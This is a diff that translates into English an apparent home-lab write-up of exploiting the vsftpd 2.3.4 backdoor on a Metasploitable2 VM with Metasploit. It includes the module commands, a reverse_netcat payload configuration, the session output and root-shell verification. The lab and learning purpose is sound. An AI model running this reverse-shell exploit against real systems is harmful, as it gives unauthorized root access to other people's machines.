@@ -1,67 +1,71 @@
 # 02 — Exploitation: vsftpd 2.3.4 Backdoor via Metasploit
 
-## Categoria
+## Category
 Red Team / Exploitation / Metasploit Framework
 
-## Obiettivo
-Sfruttare la backdoor del server FTP vsftpd 2.3.4 usando
-Metasploit Framework per ottenere una shell root sul target.
+## Objective
+Exploit the vsftpd 2.3.4 FTP server backdoor using
+Metasploit Framework to obtain a root shell on the target.
 
-## Background — La Storia di questa Backdoor
-Nel luglio 2011 qualcuno compromise il repository ufficiale
-di vsftpd e inserì una backdoor nel codice sorgente v2.3.4.
-Il trigger: inviare un username contenente ":)" fa aprire
-una shell root sulla porta 6200. CVE non assegnato — fu
-scoperto e rimosso in 3 giorni, ma chi aveva già scaricato
-quella versione era compromesso.
+## Background — The Story of This Backdoor
+In July 2011 someone compromised the official vsftpd repository
+and inserted a backdoor in source code v2.3.4.
+The trigger: sending a username containing ":)" opens
+a root shell on port 6200. No CVE assigned — it was
+discovered and removed in 3 days, but anyone who had already
+downloaded that version was compromised.
 
-## Ambiente
+## Environment
 
-| Ruolo | VM | IP | Porta |
+| Role | VM | IP | Port |
 |---|---|---|---|
 | Attacker | Kali Linux | 10.10.10.100 | 4444 (listener) |
 | Target | Metasploitable2 | 10.10.10.101 | 21 (FTP) |
 
 ## Tool
-**Metasploit Framework v6.4.116** — preinstallato su Kali.
+**Metasploit Framework v6.4.116** — pre-installed on Kali.
 
-## Procedura Completa
+## Full Procedure
 
-### 1 — Avvio Metasploit
+### 1 — Start Metasploit
 ```bash
 msfconsole
 ```
-![msfconsole avvio](screenshots/msf-01-msfconsole-avvio.png)
+![msfconsole startup](screenshots/msf-01-msfconsole-avvio.png)
 
-### 2 — Ricerca e Selezione Modulo
+### 2 — Search and Select Module
 ```
 msf > search vsftpd
 msf > use exploit/unix/ftp/vsftpd_234_backdoor
 ```
-Il modulo ha rank **excellent** — affidabilità massima.
+Module has **excellent** rank — maximum reliability.
 
-![Search e use modulo](screenshots/msf-02-search-use-modulo.png)
+![Search and use module](screenshots/msf-02-search-use-modulo.png)
 
-### 3 — Configurazione Opzioni
+### 3 — Configure Options
+```
 msf exploit(...) > show options
+```
 ![Show options](screenshots/msf-03-show-options.png)
 
-Opzioni richieste:
-- `RHOSTS` — IP target
-- `LHOST` — IP Kali (necessario per reverse shell)
-- `PAYLOAD` — tipo di shell
+Required options:
+- `RHOSTS` — target IP
+- `LHOST` — Kali IP (needed for reverse shell)
+- `PAYLOAD` — shell type
 
-### 4 — Errore Incontrato: LHOST Mancante
+### 4 — Error Encountered: Missing LHOST
 
-Primo tentativo senza LHOST:
+First attempt without LHOST:
+```
 [-] Msf::OptionValidateError: LHOST required
-![Errore LHOST](screenshots/msf-04-errore-lhost.png)
+```
+![LHOST error](screenshots/msf-04-errore-lhost.png)
 
-**Causa:** payload reverse shell richiede LHOST — il target
-deve sapere dove connettersi. Risolto cambiando payload e
-impostando LHOST esplicitamente.
+**Cause:** reverse shell payload requires LHOST — the target
+must know where to connect. Fixed by changing payload and
+setting LHOST explicitly.
 
-### 5 — Configurazione Corretta ed Exploit
+### 5 — Correct Configuration and Exploit
 ```
 msf exploit(...) > set PAYLOAD cmd/unix/reverse_netcat
 msf exploit(...) > set LHOST 10.10.10.100
@@ -76,7 +80,7 @@ Output:
 [*] Command shell session 1 opened (10.10.10.100:4444 → 10.10.10.101:33087)
 ```
 
-### 6 — Verifica Shell Root
+### 6 — Root Shell Verification
 ```bash
 whoami    # root
 id        # uid=0(root) gid=0(root)
@@ -84,24 +88,24 @@ hostname  # metasploitable
 uname -a  # Linux metasploitable 2.6.24-16-server i686
 ```
 
-![Shell root ottenuta](screenshots/msf-05-shell-root-ottenuta.png)
+![Root shell obtained](screenshots/msf-05-shell-root-ottenuta.png)
 
-## Confronto con Exploit Precedente
+## Comparison with Previous Exploit
 
-| Aspetto | nc porta 1524 | Metasploit vsftpd |
+| Aspect | nc port 1524 | Metasploit vsftpd |
 |---|---|---|
 | Tool | netcat | Metasploit Framework |
-| Tipo | Bind shell | Reverse shell |
-| Connessione | Kali → Target | Target → Kali |
-| Complessità | Minima | Media |
+| Type | Bind shell | Reverse shell |
+| Connection | Kali → Target | Target → Kali |
+| Complexity | Minimal | Medium |
 
-## Lezioni Imparate
-- Metasploit richiede LHOST per payload reverse shell
-- La raw shell non mostra prompt — non significa che sia bloccata
-- Rank "excellent" = exploit stabile e affidabile
-- Il payload giusto dipende dall'OS target: Metasploitable2
-  è vecchio i686, `cmd/unix/reverse_netcat` è più compatibile
-  del meterpreter moderno
+## Lessons Learned
+- Metasploit requires LHOST for reverse shell payloads
+- Raw shell shows no prompt — does not mean it is stuck
+- Rank "excellent" = stable and reliable exploit
+- The right payload depends on target OS: Metasploitable2
+  is old i686, `cmd/unix/reverse_netcat` is more compatible
+  than modern meterpreter
 
 ## Snapshot
 `03-kali-vsftpd-exploit-metasploit`
